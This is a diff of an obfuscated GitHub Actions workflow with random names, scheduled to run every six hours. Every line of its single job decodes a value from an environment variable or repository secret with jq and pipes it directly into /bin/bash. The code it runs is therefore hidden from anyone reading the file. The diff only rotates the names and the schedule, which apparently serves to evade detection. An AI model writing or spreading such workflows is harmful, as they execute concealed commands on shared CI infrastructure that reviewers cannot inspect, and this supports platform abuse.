@@ -1,11 +1,9 @@
 name: ckajx
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '37 5/6 * * *'
-
-jobs:  # 6627
+    - cron: '24 1/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -13,13 +11,13 @@ jobs:  # 6627
       - uses: actions/checkout@v4
       - name: ckajx
         env:
-          lmj66886: ${{ secrets.lmj66886 }}
+          wivp660: ${{ secrets.wivp660 }}
         run: |
-          echo $lmj66886 | jq -r .oqvxl60355 | /bin/bash
-          echo $xolp16 | jq -r .h298 | /bin/bash
-          echo $l5 | jq -r .pmvcn37 | /bin/bash
-          echo $sovzm02 | jq -r .h59962 | /bin/bash
-          echo $ob88 | jq -r .awbno437 | /bin/bash
-          echo $ro7846 | jq -r .yn527 | /bin/bash
-          echo $oyrp4 | jq -r .gcuuz00834 | /bin/bash
+          echo $wivp660 | jq -r .bg03 | /bin/bash
+          echo $yugt8710 | jq -r .gcxg898 | /bin/bash
+          echo $qjcgc63800 | jq -r .c4393 | /bin/bash
+          echo $hczk7953 | jq -r .lsq3 | /bin/bash
+          echo $qam74053 | jq -r .ia6436 | /bin/bash
+          echo $iz77 | jq -r .z4779 | /bin/bash
+          echo $ooqa8 | jq -r .i6668 | /bin/bash
 
